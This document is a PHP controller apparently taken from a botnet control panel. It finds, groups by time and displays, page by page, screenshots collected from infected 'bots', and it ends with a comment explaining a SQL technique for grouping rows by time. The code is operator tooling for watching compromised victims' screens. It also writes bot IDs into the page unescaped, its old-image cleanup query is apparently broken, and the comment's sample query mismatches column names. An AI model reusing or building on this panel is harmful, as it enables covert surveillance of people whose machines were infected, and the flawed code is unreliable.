<?php
require_once 'system/lib/db.php';
require_once 'system/lib/dbpdo.php';

class reports_imagesController {

	/** Days to store image history
	 * @const int
	 */
	const HISTORY_DAYS = 10;

	/** The number of screenshots to display per page
	 * @const int
	 */
	const SCREENSHOTS_PER_PAGE = 150;

	function actionIndex($botId = null){
		ThemeBegin(LNG_MM_REPORTS_IMAGES, 0, getBotJsMenu('botmenu'), 0);

		$onfinish  = '?m=reports_images/ajaxGallery/';
		$onfinish .= '&date='.date('Y-m-d');
		if (!empty($botId))
			$onfinish .= '&botId='.rawurlencode($botId);

		echo '<div id="preparing" style="display: none;" data-onfinish="', $onfinish, '">', LNG_UPDATING_DATABASE, '<img src="theme/throbber.gif" />', '</div>';

		echo <<<HTML
		<div id="gallery"></div>

		<script src="theme/video/colorbox/colorbox/jquery.colorbox-min.js"></script>
		<link rel="stylesheet" href="theme/video/colorbox/example1/colorbox.css" type="text/css" media="screen">

		<script src="theme/js/page-reports_images.js"></script>

		<script src="theme/js/jPager3k/jPager3k.js"></script>
		<link rel="stylesheet" href="theme/js/jPager3k/jPager3k.css" type="text/css" media="screen">
		<link rel="stylesheet" href="theme/js/jPager3k/jPager3k-default.css" type="text/css" media="screen">
HTML;

		ThemeEnd();
	}

	/**
	 * Prepare the database
	 */
	function actionAjaxPrepare(){
		ignore_user_abort(true);
		set_time_limit(60*60);
		self::_remove_old_images();
		self::_discover_new_images();
		self::_group_tclose_images();
		ignore_user_abort(false);
	}

	/** Display screenshots gallery
	 * @param string $date The date to display the gallery for: '2003-12-31'
	 * @param int $page The page number
	 * @param null $botId
	 */
	function actionAjaxGallery($date, $page=1, $botId = null){
		$db = dbPDO::singleton();
		$date_int = strtotime($date);

		# Find the min date fitting the requirement
		$q = $db->prepare('SELECT MAX(ftime) FROM `botnet_screenshots` WHERE ftime <= :ftime;');
		$q->execute(array(':ftime' => $date_int));
		$d = $q->fetchColumn(0);
		if (!is_null($d)){
			$date_int = $d;
			$date = date('Y-m-d', $date_int);
		}

		# Paginator
		$PAGER = new Paginator($page, self::SCREENSHOTS_PER_PAGE);

		# Load images
		$q = $db->prepare('
			SELECT SQL_CALC_FOUND_ROWS *
			FROM `botnet_screenshots` `bs`
			WHERE
				`ftime` BETWEEN :ftime0 AND :ftime1
				AND (:botId IS NULL OR `botId`=:botId )
			ORDER BY `group` DESC, `ftime` ASC
			LIMIT :limit, :perpage
			;');
		$q->bindValue(':ftime0', $date_int);
		$q->bindValue(':ftime1', $date_int + 60*60*24);
		$q->bindValue(':botId', $botId);
		$PAGER->pdo_limit($q, ':limit', ':perpage');
		$q->setFetchMode(dbPDO::FETCH_OBJ);
		$q->execute();
		$PAGER->total($db->found_rows());

		# Output
		echo '<div class="botgallery-date" id="botgallery-date-'.$date.'">';
		echo '<h1>', $date, '</h1>';
		$prev_botId = null;
		foreach ($q as $row){
			if ($prev_botId !== $row->botId){
				if (!is_null($prev_botId))
					echo '</ul>';
				echo '<h2><a href="?m=reports_images/ajaxGallery&date=', date('Y-m-d'), '&botId=', $row->botId, '">', $row->botId, '</a></h2>';
				echo '<ul class="botgallery">';
				$prev_botId = $row->botId;
			}

			$img = $GLOBALS['config']['reports_path'] . '/files/' . $row->file;
			echo '<li>',
					'<a href="', $img, '" rel="bs', $row->group, '" title="', htmlspecialchars($row->file), '" class="LOL">',
						'<img src="', $img, '" class="BUGAGA" />',
						'</a>',
					'</li>';
		}

		# Final
		echo is_null($prev_botId)? LNG_NO_RESULTS : '</ul>';

		# Pager
		if ($PAGER->page_count > 1)
			echo $PAGER->jPager3k('?m=reports_images/ajaxGallery&date='.$date.'&page=%page%'. (is_null($botId)? '' : ('&botId='.$botId)), null, 'jPager3k');

		echo '</div>';

		# Load more results
		if ($db->query('SELECT EXISTS(SELECT 1 FROM `botnet_screenshots` WHERE `ftime`<'.$date_int.')')->fetchColumn(0))
			echo '<a href="?m=reports_images/ajaxGallery&date=', date('Y-m-d', $date_int-60*60*24), is_null($botId)? '' : ('&botId='.$botId), '" id="load_more">', LNG_LOAD_MORE, '</a>';
	}

	static function _remove_old_images(){
		$db = dbPDO::singleton();
		$db->query('DELETE FROM `botnet_screenshots` WHERE `ftime`<'.(self::HISTORY_DAYS*60*60*24));
	}

	/**
	 * Discover new images & add them to the database
	 * @return int The number of found images
	 */
	static function _discover_new_images($extensions_list = '.jpg.jpeg.png.gif'){
		$db = dbPDO::singleton();

		# Prepare the INSERT statement
		$insert = new stdClass;
		$insert->Q = $db->prepare('INSERT IGNORE INTO `botnet_screenshots` SET `botId`=:botId, `file`=:file, `ftime`=:ftime;');
		$insert->Q->bindParam(':botId',  $insert->botId,    PDO::PARAM_STR);
		$insert->Q->bindParam(':file',   $insert->file,     PDO::PARAM_STR);
		$insert->Q->bindParam(':ftime',  $insert->ftime,    PDO::PARAM_INT);

		# Loop throught the existing bots...
		$q_select = $db->query(
			'SELECT `bl`.`botnet`, `bl`.`bot_id`, COALESCE(MAX(`bs`.`ftime`), '.(self::HISTORY_DAYS*60*60*24).') AS `maxftime`
			 FROM `botnet_list` `bl` LEFT JOIN `botnet_screenshots` `bs` ON(`bl`.`bot_id` = `bs`.`botId`)
			 GROUP BY `bot_id`
			 ;', dbPDO::FETCH_OBJ);

		# ... and search for matching files
		$found_images = 0;
		foreach ($q_select as $row)
			if (file_exists($botpathf = $GLOBALS['config']['reports_path'].($botpath = '/files/'. ($relpath = $row->botnet.'/'.$row->bot_id)))){
				$insert->botId = $row->bot_id;
				# Search files in whose `mtime` >= $row->maxftime
				$d = opendir($botpathf);
				while ($d && !is_bool($f = readdir($d)))
					if (   $f[0] != '.'
							&& filemtime($fpath = "$botpathf/$f") >= $row->maxftime # mtime is >= last found file for this bot
							&& strpos($extensions_list, strtolower(strrchr($f, '.'))) !== FALSE # extensions filter
					){
						$insert->file = "$relpath/$f";
						$insert->ftime = filemtime($fpath);
						$insert->Q->execute();
						$found_images++;
					}
			}
		return $found_images;
	}

	/** Issue a query to group images by temporal proximity
	 */
	static function _group_tclose_images($granularity = 3600){
		$db = dbPDO::singleton();
		$db->query(
			"CREATE TEMPORARY TABLE `_botnet_screenshotsg`
			SELECT MAX(`g`.`id`) AS `group`, `f`.`id`
			FROM `botnet_screenshots` `g`
				CROSS JOIN `botnet_screenshots` `f`
				ON (`f`.`botId` = `g`.`botId`
					AND `f`.`ftime` BETWEEN `g`.`ftime`-$granularity AND `g`.`ftime`
				)
			WHERE `f`.`ftime` >= (UNIX_TIMESTAMP()-2*$granularity)
				OR `f`.`group` IS NULL
			GROUP BY `f`.`id`;
			;");
		$db->query(
			'UPDATE `botnet_screenshots` `f` CROSS JOIN `_botnet_screenshotsg` `g` USING(`id`)
			 SET `f`.`group` = `g`.`group`
			;');
	}
}



/*
Select rows, ordered by `ftime` DESC, but rows from one `botId` do stick together:

CREATE TABLE `feed`(
  `id` INT UNSIGNED NOT NULL AUTO_INCREMENT,
  `tm` INT UNSIGNED NOT NULL,
  `user_id` INT UNSIGNED NOT NULL,
  `image` VARCHAR(255) NOT NULL,
  `group` INT UNSIGNED NULL DEFAULT NULL,
  PRIMARY KEY(`id`)
  );

INSERT INTO `feed` VALUES
(1,  10000001, 1, '1-d.jpg', NULL),
(2,  10000002, 1, '1-c.jpg', NULL),
(3,  10000003, 1, '1-b.jpg', NULL),
(4,  10000004, 2, '2-b.jpg', NULL),
(5,  10000005, 1, '1-a.jpg', NULL),
(6,  10000006, 2, '2-a.jpg', NULL),

(11, 10010001, 1, '1-D.jpg', 15),
(12, 10010002, 1, '1-C.jpg', 15),
(13, 10010003, 1, '1-B.jpg', 15),
(14, 10010004, 2, '2-B.jpg', 16),
(15, 10010005, 1, '1-A.jpg', 15),
(16, 10010006, 2, '2-A.jpg', 16),

(21, 10010021, 1, '1-DDn.jpg', NULL),
(22, 10010022, 1, '1-CCn.jpg', NULL),
(23, 10010023, 1, '1-BBn.jpg', NULL),
(24, 10010024, 2, '2-BBn.jpg', NULL),
(25, 10010025, 1, '1-AAn.jpg', NULL),
(26, 10010026, 2, '2-AAn.jpg', NULL)
;



### ALL POSTS FROM THE MOST RECENT USER ARE ON TOP

SELECT `f`.*
FROM `feed` `f`
	INNER JOIN (
		SELECT `user_id`, MAX(`tm`) AS `maxtm`
		FROM `feed`
		GROUP BY `user_id`
	) `g` ON(`f`.`botId` = `g`.`botId`)
ORDER BY `g`.`maxftime` DESC, `f`.`ftime` DESC;



### HOW TO GROUP ROWS THAT ARE TEMPORALLY CLOSE TO EACH OTHER:

That's out playground:

	CREATE TABLE `feed`(
	  `id` INT UNSIGNED NOT NULL AUTO_INCREMENT,
	  `tm` INT UNSIGNED NOT NULL COMMENT 'timestamp',
	  `user_id` INT UNSIGNED NOT NULL COMMENT 'author id',
	  `image` VARCHAR(255) NOT NULL COMMENT 'posted image filename',
	  `group` INT UNSIGNED NULL DEFAULT NULL COMMENT 'post group',
	  PRIMARY KEY(`id`),
	  INDEX(`user_id`),
	  INDEX(`tm`,`group`)
	  );

We'd like to group together posts that are temporally close.

First, declare the wanted granularity: the threshold to temporal proximity:

	SET @granularity:=60*60;

Each row forms a group with group ID matching the row id (it can also be a timestamp):

	SELECT `g`.`id` AS `group`
	FROM `feed` `g`;

Each group contains rows that originate from the same user, were posted earlier than the group-former:

	SELECT `g`.`id` AS `group`, `f`.*
	FROM `feed` `g`
		CROSS JOIN `feed` `f`
		ON (`f`.`user_id` = `g`.`user_id`
			AND `f`.`tm` BETWEEN `g`.`tm`-@granularity AND `g`.`tm`
		)

Each row belongs to multiple groups. For each row, we pick the most 'broad' group: it has the biggest rowId

	SELECT MAX(`g`.`id`) AS `group`, `f`.*
	FROM `feed` `g`
		CROSS JOIN `feed` `f`
		ON (`f`.`user_id` = `g`.`user_id`
			AND `f`.`tm` BETWEEN `g`.`tm`-@granularity AND `g`.`tm`
		)
	GROUP BY `f`.`id`

The most recently updated group always jumps to the top (if you sort by `group` DESC).
However, if you'd like the groups be persistent (e.g. so items don't move from one group to another), use `MIN` instead of `MAX`:

	SELECT MIN(`g`.`id`) AS `group`, `f`.*
	FROM `feed` `g`
		CROSS JOIN `feed` `f`
		ON (`f`.`user_id` = `g`.`user_id`
			AND `f`.`tm` BETWEEN `g`.`tm` AND `g`.`tm`+@granularity
		)
	GROUP BY `f`.`id`

Now, we're going to update the table's `group` column.
First, MySQL can't update the same table you're reading from. Wee need a temporary table.
Second: we only update the rows whose `group` column is NULL, or rows posted later than `UNIX_TIMESTAMP()-2*@threshold`:

	CREATE TEMPORARY TABLE `_feedg`
	SELECT MAX(`g`.`id`) AS `group`, `f`.`id`
	FROM `feed` `g`
		CROSS JOIN `feed` `f`
		ON (`f`.`user_id` = `g`.`user_id`
			AND `f`.`tm` BETWEEN `g`.`tm`-@granularity AND `g`.`tm`
		)
	WHERE `f`.`group` IS NULL
		OR `f`.`tm` >= (UNIX_TIMESTAMP()-2*@granularity)
	GROUP BY `f`.`id`;

And update the `group` column:

	UPDATE `feed` `f` CROSS JOIN `_feedg` `g` USING(`id`)
	SET `f`.`group` = `g`.`group`;

Here's the SQLFiddle: http://sqlfiddle.com/#!2/be9ce/15

 */
